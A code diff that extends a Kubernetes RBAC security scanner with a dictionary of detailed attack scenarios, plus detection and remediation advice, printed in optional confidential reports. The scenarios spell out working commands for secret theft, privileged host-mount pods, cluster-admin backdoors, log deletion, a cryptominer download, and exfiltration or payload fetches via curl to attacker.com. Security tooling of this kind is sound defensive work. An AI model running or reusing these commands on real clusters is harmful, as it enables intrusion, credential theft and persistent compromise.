@@ -75,8 +75,433 @@ import yaml
 import sys
 import re
 from pathlib import Path
-from typing import Dict, List, Set
+from typing import Dict, List, Set, Optional
 from collections import defaultdict
+
+# ==============================================================================
+# ATTACK SCENARIO TEMPLATES
+# ==============================================================================
+# These detailed exploitation chains are ONLY included in private security
+# advisories for authorized security personnel. Public reports show impact only.
+#
+# Format: {finding_pattern: {scenario_name: scenario_details}}
+# ==============================================================================
+
+ATTACK_SCENARIOS = {
+    'wildcard_resources': {
+        'scenario': 'Cluster-Wide Resource Enumeration and Exfiltration',
+        'severity': 'CRITICAL',
+        'attack_chain': [
+            {
+                'step': 1,
+                'action': 'Compromise ServiceAccount with wildcard resource access',
+                'command': 'kubectl get secrets --all-namespaces -o json',
+                'impact': 'Attacker can list ALL resources across ALL namespaces',
+                'cve_reference': 'CVE-2018-1002105 (privilege escalation via API aggregation)'
+            },
+            {
+                'step': 2,
+                'action': 'Exfiltrate sensitive data from discovered resources',
+                'command': 'kubectl get secrets -n kube-system -o yaml | grep "data:" -A 50',
+                'impact': 'Extract base64-encoded secrets, tokens, certificates',
+                'real_world': 'Tesla 2018 breach: Attacker accessed Kubernetes secrets without authentication'
+            },
+            {
+                'step': 3,
+                'action': 'Lateral movement using stolen credentials',
+                'command': 'kubectl --token=$STOLEN_TOKEN get pods --all-namespaces',
+                'impact': 'Pivot to other workloads using compromised service account tokens',
+                'persistence': 'Create new ServiceAccounts with elevated privileges for backdoor access'
+            }
+        ],
+        'prerequisites': [
+            'Initial access to a pod using the overprivileged ServiceAccount',
+            'kubectl binary available in container (common in operator pods)',
+            'Network connectivity to Kubernetes API server'
+        ],
+        'detection': [
+            'Audit logs: Unusual --all-namespaces queries from service accounts',
+            'Rate limiting: Excessive API calls to list resources',
+            'Anomaly detection: ServiceAccount accessing resources outside its namespace'
+        ],
+        'remediation': [
+            'Replace wildcard (*) with explicit resource names',
+            'Scope permissions to specific namespaces using RoleBindings',
+            'Implement least privilege: grant only required resources'
+        ]
+    },
+    'wildcard_verbs': {
+        'scenario': 'Unrestricted API Access Exploitation',
+        'severity': 'CRITICAL',
+        'attack_chain': [
+            {
+                'step': 1,
+                'action': 'Discover wildcard verb permissions',
+                'command': 'kubectl auth can-i --list --as=system:serviceaccount:default:victim-sa',
+                'impact': 'Identify full scope of allowed operations (create, delete, patch, etc.)',
+                'tool': 'rbac-lookup or kubectl-who-can for privilege enumeration'
+            },
+            {
+                'step': 2,
+                'action': 'Create malicious resources (pods, deployments, jobs)',
+                'command': '''kubectl run evil-pod --image=attacker/backdoor --restart=Never --overrides='
+                {
+                  "spec": {
+                    "hostNetwork": true,
+                    "hostPID": true,
+                    "containers": [{
+                      "name": "evil",
+                      "image": "attacker/backdoor",
+                      "securityContext": {
+                        "privileged": true
+                      },
+                      "volumeMounts": [{
+                        "name": "host",
+                        "mountPath": "/host"
+                      }]
+                    }],
+                    "volumes": [{
+                      "name": "host",
+                      "hostPath": {
+                        "path": "/"
+                      }
+                    }]
+                  }
+                }'
+                ''',
+                'impact': 'Deploy privileged container with host filesystem access',
+                'escalation': 'Break out of container to compromise node'
+            },
+            {
+                'step': 3,
+                'action': 'Delete evidence and create persistence',
+                'command': 'kubectl delete events --all; kubectl create -f backdoor-cronjob.yaml',
+                'impact': 'Cover tracks by deleting audit events, establish persistence via CronJob',
+                'real_world': 'TeamTNT cryptojacking campaigns: Deploy miners, delete logs'
+            }
+        ],
+        'prerequisites': [
+            'ServiceAccount with wildcard verbs (*) on any resource',
+            'Ability to exec into pod or access via compromised application'
+        ],
+        'detection': [
+            'Monitor for resource creation from unexpected ServiceAccounts',
+            'Alert on privileged pod creation outside CI/CD pipelines',
+            'Track event deletion (indicates evasion)'
+        ],
+        'remediation': [
+            'Replace wildcard verbs with specific operations (get, list, watch)',
+            'Separate read-only and write permissions into different roles',
+            'Use admission controllers (OPA Gatekeeper) to block privileged pods'
+        ]
+    },
+    'dangerous_verb_escalate': {
+        'scenario': 'RBAC Self-Escalation to Cluster-Admin',
+        'severity': 'CRITICAL',
+        'attack_chain': [
+            {
+                'step': 1,
+                'action': 'Verify escalate permission on ClusterRoles',
+                'command': 'kubectl auth can-i escalate clusterrole --as=system:serviceaccount:default:victim-sa',
+                'impact': 'Confirm ability to bypass RBAC restrictions via escalate verb',
+                'cve_reference': 'CVE-2019-11247 (cluster-scoped resources in namespaced context)'
+            },
+            {
+                'step': 2,
+                'action': 'Create malicious ClusterRoleBinding granting cluster-admin',
+                'command': '''kubectl create clusterrolebinding pwned-admin \\
+                  --clusterrole=cluster-admin \\
+                  --serviceaccount=default:victim-sa
+                ''',
+                'impact': 'Elevate to cluster-admin without restrictions',
+                'bypass': 'The escalate verb allows granting permissions higher than current level'
+            },
+            {
+                'step': 3,
+                'action': 'Full cluster compromise',
+                'command': 'kubectl get secrets --all-namespaces; kubectl delete all --all --all-namespaces',
+                'impact': 'Complete cluster control: exfiltrate all secrets, destroy workloads',
+                'persistence': 'Create hidden admin ServiceAccounts in kube-system namespace'
+            }
+        ],
+        'prerequisites': [
+            'escalate verb on clusterroles or roles',
+            'create verb on clusterrolebindings or rolebindings'
+        ],
+        'detection': [
+            'Alert on ClusterRoleBinding creation by non-admin ServiceAccounts',
+            'Monitor for unusual escalate verb usage in audit logs',
+            'Track ServiceAccount permission changes'
+        ],
+        'remediation': [
+            'NEVER grant escalate verb unless absolutely required',
+            'Use ValidatingAdmissionWebhook to block unauthorized ClusterRoleBindings',
+            'Restrict ClusterRoleBinding creation to cluster-admin only'
+        ]
+    },
+    'dangerous_verb_impersonate': {
+        'scenario': 'Identity Spoofing and Privilege Hijacking',
+        'severity': 'CRITICAL',
+        'attack_chain': [
+            {
+                'step': 1,
+                'action': 'Enumerate high-privilege users and ServiceAccounts',
+                'command': 'kubectl get clusterrolebindings -o json | jq ".items[] | select(.roleRef.name==\\"cluster-admin\\")"',
+                'impact': 'Identify cluster-admin users to impersonate',
+                'target': 'system:masters group, cluster-admin ServiceAccounts'
+            },
+            {
+                'step': 2,
+                'action': 'Impersonate cluster-admin user',
+                'command': 'kubectl --as=system:admin get secrets --all-namespaces',
+                'impact': 'Bypass RBAC by impersonating privileged identity',
+                'bypass': 'Impersonate verb allows full identity spoofing without authentication'
+            },
+            {
+                'step': 3,
+                'action': 'Create backdoor ServiceAccount with cluster-admin',
+                'command': '''kubectl --as=system:admin create sa backdoor -n kube-system
+                kubectl --as=system:admin create clusterrolebinding backdoor-admin --clusterrole=cluster-admin --serviceaccount=kube-system:backdoor
+                kubectl --as=system:admin create token backdoor -n kube-system --duration=87600h  # 10 years
+                ''',
+                'impact': 'Establish long-term persistent access with extracted token',
+                'evasion': 'Use kube-system namespace to hide in legitimate system workloads'
+            }
+        ],
+        'prerequisites': [
+            'impersonate verb on users, groups, or serviceaccounts',
+            'Knowledge of privileged identities to impersonate'
+        ],
+        'detection': [
+            'Alert on API requests with --as or impersonation headers',
+            'Monitor for ServiceAccount creation in kube-system namespace',
+            'Track token creation with unusually long durations'
+        ],
+        'remediation': [
+            'NEVER grant impersonate verb to ServiceAccounts',
+            'Restrict impersonation to debugging tools only (kubectl-impersonate plugin)',
+            'Use audit logs to detect impersonation abuse'
+        ]
+    },
+    'dangerous_resource_secrets': {
+        'scenario': 'Cluster-Wide Secret Exfiltration',
+        'severity': 'HIGH',
+        'attack_chain': [
+            {
+                'step': 1,
+                'action': 'List all secrets across all namespaces',
+                'command': 'kubectl get secrets --all-namespaces -o json > /tmp/secrets.json',
+                'impact': 'Enumerate all secrets in cluster (API keys, passwords, certificates)',
+                'scale': 'Hundreds or thousands of secrets depending on cluster size'
+            },
+            {
+                'step': 2,
+                'action': 'Decode and exfiltrate sensitive data',
+                'command': '''for secret in $(kubectl get secrets --all-namespaces -o json | jq -r '.items[].metadata.name'); do
+                  kubectl get secret $secret -o json | jq -r '.data | to_entries[] | "\\(.key): \\(.value)"' | while read line; do
+                    echo "$line" | awk -F': ' '{print $1": "} {print $2 | "base64 -d"}'
+                  done
+                done > /tmp/plaintext_secrets.txt
+                ''',
+                'impact': 'Decrypt all base64-encoded secrets, extract plaintext credentials',
+                'targets': 'Database passwords, cloud provider keys (AWS_ACCESS_KEY), TLS certificates'
+            },
+            {
+                'step': 3,
+                'action': 'Lateral movement to external systems',
+                'command': 'export AWS_ACCESS_KEY_ID=$STOLEN_KEY; aws s3 sync s3://company-data /tmp/exfil/',
+                'impact': 'Use stolen credentials to access external systems (AWS, GCP, databases)',
+                'real_world': 'Capital One breach (2019): SSRF → AWS creds → 100M records stolen'
+            }
+        ],
+        'prerequisites': [
+            'get/list verbs on secrets resource',
+            'Cluster-wide scope (ClusterRole) or access to multiple namespaces'
+        ],
+        'detection': [
+            'Alert on bulk secret reads (>10 secrets in short time window)',
+            'Monitor for secrets accessed by ServiceAccounts outside their namespace',
+            'Track base64 decode operations in container processes'
+        ],
+        'remediation': [
+            'Limit secrets access to specific namespaces using RoleBindings',
+            'Use external secret managers (Vault, AWS Secrets Manager)',
+            'Implement encryption at rest for etcd (Kubernetes secret backend)'
+        ]
+    },
+    'dangerous_resource_pods_exec': {
+        'scenario': 'Container Hijacking and Data Exfiltration',
+        'severity': 'HIGH',
+        'attack_chain': [
+            {
+                'step': 1,
+                'action': 'Enumerate running pods with sensitive data',
+                'command': 'kubectl get pods --all-namespaces -o wide',
+                'impact': 'Identify targets: database pods, application servers, CI/CD runners',
+                'targeting': 'Focus on pods with mounted secrets or external network access'
+            },
+            {
+                'step': 2,
+                'action': 'Execute commands in target container',
+                'command': '''kubectl exec -it database-pod -n production -- bash -c "
+                  mysqldump -u root -p$MYSQL_PASSWORD --all-databases > /tmp/db_dump.sql
+                  cat /tmp/db_dump.sql | base64 | curl -X POST https://attacker.com/exfil -d @-
+                "
+                ''',
+                'impact': 'Dump databases, exfiltrate via HTTP POST to attacker-controlled server',
+                'evasion': 'Use base64 encoding to bypass DLP/firewall detection'
+            },
+            {
+                'step': 3,
+                'action': 'Deploy cryptominer or backdoor',
+                'command': '''kubectl exec -it victim-pod -- bash -c "
+                  curl -s https://attacker.com/miner -o /tmp/xmrig
+                  chmod +x /tmp/xmrig
+                  nohup /tmp/xmrig -o pool.monero.com:3333 &
+                "
+                ''',
+                'impact': 'Install cryptominer for resource abuse, establish persistence',
+                'real_world': 'Graboid (2019): First Kubernetes cryptomining worm using pods/exec'
+            }
+        ],
+        'prerequisites': [
+            'create verb on pods/exec subresource',
+            'Network access to target pods'
+        ],
+        'detection': [
+            'Alert on kubectl exec from unexpected ServiceAccounts',
+            'Monitor for unusual process execution in containers (xmrig, wget, curl)',
+            'Track outbound network connections to non-whitelisted domains'
+        ],
+        'remediation': [
+            'Remove pods/exec access unless required for debugging',
+            'Use ephemeral debug containers (alpha feature) instead of exec',
+            'Implement PodSecurityPolicy to block privileged operations'
+        ]
+    },
+    'escalation_create_pods': {
+        'scenario': 'Privileged Pod Creation for Node Compromise',
+        'severity': 'HIGH',
+        'attack_chain': [
+            {
+                'step': 1,
+                'action': 'Create privileged pod with host access',
+                'command': '''kubectl apply -f - <<EOF
+                apiVersion: v1
+                kind: Pod
+                metadata:
+                  name: node-pwner
+                spec:
+                  hostNetwork: true
+                  hostPID: true
+                  hostIPC: true
+                  containers:
+                  - name: pwn
+                    image: alpine
+                    securityContext:
+                      privileged: true
+                    volumeMounts:
+                    - name: host-root
+                      mountPath: /host
+                  volumes:
+                  - name: host-root
+                    hostPath:
+                      path: /
+                  nodeSelector:
+                    kubernetes.io/hostname: master-node-1
+                EOF
+                ''',
+                'impact': 'Deploy container with full host privileges, mounted host filesystem',
+                'target': 'Schedule on master node for maximum impact'
+            },
+            {
+                'step': 2,
+                'action': 'Container escape to node',
+                'command': '''kubectl exec -it node-pwner -- sh -c "
+                  chroot /host
+                  cat /etc/shadow > /tmp/shadow_hashes
+                  crontab -l; echo '*/5 * * * * /tmp/backdoor.sh' | crontab -
+                "
+                ''',
+                'impact': 'Break out of container, access host filesystem, install persistence',
+                'escalation': 'From container compromise → node root access'
+            },
+            {
+                'step': 3,
+                'action': 'Pivot to other nodes',
+                'command': '''# From compromised node
+                kubectl get nodes -o json | jq -r '.items[].status.addresses[] | select(.type=="InternalIP") | .address' | while read node_ip; do
+                  ssh root@$node_ip "curl https://attacker.com/payload | sh"
+                done
+                ''',
+                'impact': 'Lateral movement to all cluster nodes using kubelet credentials',
+                'objective': 'Full cluster infrastructure compromise'
+            }
+        ],
+        'prerequisites': [
+            'create verb on pods resource',
+            'No PodSecurityPolicy or admission controller blocking privileged pods'
+        ],
+        'detection': [
+            'Alert on privileged pod creation (securityContext.privileged: true)',
+            'Monitor for hostNetwork, hostPID, hostIPC usage',
+            'Track hostPath volume mounts to sensitive directories (/, /etc, /var)'
+        ],
+        'remediation': [
+            'Implement PodSecurityPolicy to deny privileged pods',
+            'Use admission webhooks (OPA Gatekeeper) with rules blocking host access',
+            'Require manual approval for pods needing elevated privileges'
+        ]
+    },
+    'escalation_create_rolebindings': {
+        'scenario': 'RBAC Self-Service Privilege Escalation',
+        'severity': 'CRITICAL',
+        'attack_chain': [
+            {
+                'step': 1,
+                'action': 'Create RoleBinding granting cluster-admin',
+                'command': '''kubectl create clusterrolebinding self-pwn \\
+                  --clusterrole=cluster-admin \\
+                  --serviceaccount=$(kubectl config view --minify -o jsonpath='{.contexts[0].context.namespace}'):$(kubectl config view --minify -o jsonpath='{.contexts[0].context.user}')
+                ''',
+                'impact': 'Grant self cluster-admin without needing escalate verb',
+                'bypass': 'Kubernetes does not validate if RoleBinding grants higher privileges than creator'
+            },
+            {
+                'step': 2,
+                'action': 'Verify escalation succeeded',
+                'command': 'kubectl auth can-i "*" "*" --all-namespaces',
+                'impact': 'Confirm cluster-admin access (should return "yes")',
+                'validation': 'Test with: kubectl get secrets -n kube-system'
+            },
+            {
+                'step': 3,
+                'action': 'Create backdoor ClusterRoleBindings for persistence',
+                'command': '''for i in {1..5}; do
+                  kubectl create sa backdoor-$i -n kube-system
+                  kubectl create clusterrolebinding backdoor-$i --clusterrole=cluster-admin --serviceaccount=kube-system:backdoor-$i
+                done
+                ''',
+                'impact': 'Create multiple hidden admin accounts for redundant access',
+                'evasion': 'Spread across kube-system namespace to blend with legitimate system components'
+            }
+        ],
+        'prerequisites': [
+            'create/patch/update verbs on clusterrolebindings or rolebindings',
+            'Knowledge of existing high-privilege ClusterRoles (cluster-admin, admin)'
+        ],
+        'detection': [
+            'Alert on ClusterRoleBinding creation by non-admin ServiceAccounts',
+            'Monitor for sudden permission grants to ServiceAccounts',
+            'Track audit logs for rolebindings referencing cluster-admin'
+        ],
+        'remediation': [
+            'Never grant create/patch/update on rolebindings/clusterrolebindings to ServiceAccounts',
+            'Use ValidatingAdmissionWebhook to enforce RBAC modification policies',
+            'Implement four-eyes principle: require human approval for RBAC changes'
+        ]
+    }
+}
 
 class RBACAnalyzer:
     def __init__(self):
@@ -270,6 +695,13 @@ class RBACAnalyzer:
             rules = role_data['rules']
             findings_for_role = []
 
+            # Collect findings across all rules (deduplicated at role level)
+            all_dangerous_resources = set()
+            all_dangerous_verbs = set()
+            has_wildcard_resources = False
+            has_wildcard_verbs = False
+            escalation_issues = []
+
             for rule in rules:
                 resources = rule.get('resources', [])
                 verbs = rule.get('verbs', [])
@@ -281,26 +713,35 @@ class RBACAnalyzer:
 
                 # Check for wildcards
                 if '*' in resources:
-                    findings_for_role.append("Wildcard resources (*)")
+                    has_wildcard_resources = True
                 if '*' in verbs:
-                    findings_for_role.append("Wildcard verbs (*)")
+                    has_wildcard_verbs = True
 
-                # Check dangerous verbs
+                # Collect dangerous verbs
                 dangerous = set(verbs) & dangerous_verbs
-                if dangerous:
-                    findings_for_role.append(f"Dangerous verbs: {', '.join(dangerous)}")
+                all_dangerous_verbs.update(dangerous)
 
-                # Check dangerous resources
+                # Collect dangerous resources
                 dangerous_res = set(resources) & dangerous_resources
-                if dangerous_res:
-                    findings_for_role.append(f"Dangerous resources: {', '.join(dangerous_res)}")
+                all_dangerous_resources.update(dangerous_res)
 
                 # Check escalation combinations
                 for escalation_verbs, escalation_resources in escalation_combos:
                     if (set(verbs) & escalation_verbs) and (set(resources) & escalation_resources):
-                        findings_for_role.append(
-                            f"Escalation risk: {'/'.join(escalation_verbs)} on {'/'.join(escalation_resources)}"
-                        )
+                        escalation_issue = f"Escalation risk: {'/'.join(sorted(escalation_verbs))} on {'/'.join(sorted(escalation_resources))}"
+                        if escalation_issue not in escalation_issues:
+                            escalation_issues.append(escalation_issue)
+
+            # Build consolidated findings list
+            if has_wildcard_resources:
+                findings_for_role.append("Wildcard resources (*)")
+            if has_wildcard_verbs:
+                findings_for_role.append("Wildcard verbs (*)")
+            if all_dangerous_verbs:
+                findings_for_role.append(f"Dangerous verbs: {', '.join(sorted(all_dangerous_verbs))}")
+            if all_dangerous_resources:
+                findings_for_role.append(f"Dangerous resources: {', '.join(sorted(all_dangerous_resources))}")
+            findings_for_role.extend(escalation_issues)
 
             if findings_for_role:
                 print(f"**ClusterRole**: `{role_name}` ({role_data['file']})")
@@ -308,12 +749,52 @@ class RBACAnalyzer:
                     print(f"  - ⚠️  {finding}")
                 print()
 
+                # Detect applicable attack scenarios based on findings
+                attack_scenarios = []
+
+                if has_wildcard_resources:
+                    attack_scenarios.append('wildcard_resources')
+                if has_wildcard_verbs:
+                    attack_scenarios.append('wildcard_verbs')
+
+                # Check for dangerous verbs
+                if 'escalate' in all_dangerous_verbs:
+                    attack_scenarios.append('dangerous_verb_escalate')
+                if 'impersonate' in all_dangerous_verbs:
+                    attack_scenarios.append('dangerous_verb_impersonate')
+
+                # Check for dangerous resources
+                if 'secrets' in all_dangerous_resources:
+                    attack_scenarios.append('dangerous_resource_secrets')
+                if 'pods/exec' in all_dangerous_resources or 'pods/attach' in all_dangerous_resources:
+                    attack_scenarios.append('dangerous_resource_pods_exec')
+
+                # Check for escalation combos
+                for escalation_issue in escalation_issues:
+                    # Parse escalation issue to handle slash-separated verbs/resources
+                    # Example: "Escalation risk: create/delete on pods/exec"
+                    issue_lower = escalation_issue.lower().replace('escalation risk: ', '')
+
+                    if ' on ' in issue_lower:
+                        verb_part, resource_part = issue_lower.split(' on ', 1)
+                        verbs = verb_part.split('/')
+                        resources = resource_part.split('/')
+
+                        # Check for pod creation escalation
+                        if 'create' in verbs and 'pods' in resources:
+                            attack_scenarios.append('escalation_create_pods')
+
+                        # Check for role/rolebinding modification escalation
+                        if any(rb in resources for rb in ['rolebindings', 'clusterrolebindings']):
+                            attack_scenarios.append('escalation_create_rolebindings')
+
                 self._add_finding(
                     severity='HIGH',
                     title=f"ClusterRole {role_name} has dangerous permissions",
                     description="; ".join(findings_for_role),
                     file=role_data['file'],
-                    remediation="Apply principle of least privilege - specify exact resources and verbs needed"
+                    remediation="Apply principle of least privilege - specify exact resources and verbs needed",
+                    attack_scenarios=attack_scenarios
                 )
 
     def check_aggregated_roles(self):
@@ -336,22 +817,89 @@ class RBACAnalyzer:
                     remediation="Review aggregation selectors to ensure no unintended permissions are granted"
                 )
 
-    def _add_finding(self, severity: str, title: str, description: str, file: str, remediation: str):
-        """Add a security finding."""
+    def _add_finding(self, severity: str, title: str, description: str, file: str, remediation: str, attack_scenarios: Optional[List[str]] = None):
+        """Add a security finding with optional attack scenario references.
+
+        Args:
+            severity: Finding severity level
+            title: Finding title
+            description: Finding description
+            file: File path where issue was found
+            remediation: Remediation guidance
+            attack_scenarios: List of attack scenario keys from ATTACK_SCENARIOS dict
+        """
         self.findings.append({
             'severity': severity,
             'title': title,
             'description': description,
             'file': file,
-            'remediation': remediation
+            'remediation': remediation,
+            'attack_scenarios': attack_scenarios or []
         })
 
-    def generate_report(self, fail_on_severity='CRITICAL'):
+    def _format_attack_scenario(self, scenario_key: str) -> str:
+        """Format attack scenario for inclusion in security report.
+
+        Args:
+            scenario_key: Key from ATTACK_SCENARIOS dictionary
+
+        Returns:
+            Formatted markdown string with attack scenario details
+        """
+        if scenario_key not in ATTACK_SCENARIOS:
+            return ""
+
+        scenario = ATTACK_SCENARIOS[scenario_key]
+        output = []
+
+        output.append(f"\n   **Attack Scenario: {scenario['scenario']}**\n")
+        output.append(f"   - **Severity:** {scenario['severity']}\n")
+
+        # Prerequisites
+        if scenario.get('prerequisites'):
+            output.append(f"\n   **Prerequisites:**")
+            for prereq in scenario['prerequisites']:
+                output.append(f"   - {prereq}")
+
+        # Attack Chain
+        output.append(f"\n   **Attack Chain:**\n")
+        for step in scenario['attack_chain']:
+            output.append(f"   **Step {step['step']}: {step['action']}**")
+            output.append(f"   ```bash")
+            output.append(f"   {step['command']}")
+            output.append(f"   ```")
+            output.append(f"   - **Impact:** {step['impact']}")
+
+            # Optional fields
+            for optional_field in ['cve_reference', 'real_world', 'escalation', 'bypass', 'target', 'evasion', 'tool', 'targeting', 'persistence', 'objective', 'validation', 'scale', 'targets']:
+                if optional_field in step:
+                    field_name = optional_field.replace('_', ' ').title()
+                    output.append(f"   - **{field_name}:** {step[optional_field]}")
+            output.append("")
+
+        # Detection
+        if scenario.get('detection'):
+            output.append(f"   **Detection Signatures:**")
+            for detection in scenario['detection']:
+                output.append(f"   - {detection}")
+            output.append("")
+
+        # Remediation
+        if scenario.get('remediation'):
+            output.append(f"   **Remediation Steps:**")
+            for remediation in scenario['remediation']:
+                output.append(f"   - {remediation}")
+            output.append("")
+
+        return "\n".join(output)
+
+    def generate_report(self, fail_on_severity='CRITICAL', include_attack_scenarios=False):
         """Generate final security report.
 
         Args:
             fail_on_severity: Minimum severity level to trigger non-zero exit code
                              (CRITICAL, HIGH, WARNING, INFO)
+            include_attack_scenarios: If True, include detailed attack scenarios (for private reports)
         """
         print("\n---")
         print("\n## RBAC SECURITY FINDINGS SUMMARY\n")
@@ -370,6 +918,14 @@ class RBACAnalyzer:
                     print(f"   - File: `{finding['file']}`")
                     print(f"   - Issue: {finding['description']}")
                     print(f"   - Fix: {finding['remediation']}\n")
+
+                    # Include attack scenarios if requested (private mode only)
+                    if include_attack_scenarios and finding.get('attack_scenarios'):
+                        print(f"   ---\n")
+                        print(f"   **⚠️  DETAILED ATTACK SCENARIOS (CONFIDENTIAL)**\n")
+                        for scenario_key in finding['attack_scenarios']:
+                            print(self._format_attack_scenario(scenario_key))
+                        print(f"   ---\n")
 
         total = len(self.findings)
         print(f"\n**Total Findings**: {total}")
@@ -403,6 +959,9 @@ Examples:
 
   # Fail on any WARNING+ findings (strict mode)
   %(prog)s /path/to/repo --fail-on WARNING
+
+  # Include detailed attack scenarios (for private security advisories)
+  %(prog)s /path/to/repo --fail-on HIGH --include-attack-scenarios
         """
     )
     parser.add_argument('path', help='Path to repository to scan')
@@ -412,12 +971,22 @@ Examples:
         default='CRITICAL',
         help='Minimum severity level to trigger non-zero exit code (default: CRITICAL)'
     )
+    parser.add_argument(
+        '--include-attack-scenarios',
+        action='store_true',
+        default=False,
+        help='Include detailed attack scenarios with step-by-step exploitation chains (PRIVATE MODE ONLY - for security advisories)'
+    )
     args = parser.parse_args()
 
     analyzer = RBACAnalyzer()
 
     print(f"Scanning repository: {args.path}")
-    print(f"Fail threshold: {args.fail_on}+\n")
+    print(f"Fail threshold: {args.fail_on}+")
+    if args.include_attack_scenarios:
+        print(f"⚠️  Attack scenarios: ENABLED (confidential mode)")
+    print()
+
     analyzer.load_yaml_files(args.path)
 
     print(f"\nLoaded Resources:")
@@ -432,7 +1001,10 @@ Examples:
     analyzer.check_aggregated_roles()
     analyzer.analyze_privilege_chains()
 
-    exit_code = analyzer.generate_report(fail_on_severity=args.fail_on)
+    exit_code = analyzer.generate_report(
+        fail_on_severity=args.fail_on,
+        include_attack_scenarios=args.include_attack_scenarios
+    )
     sys.exit(exit_code)
 
 if __name__ == '__main__':
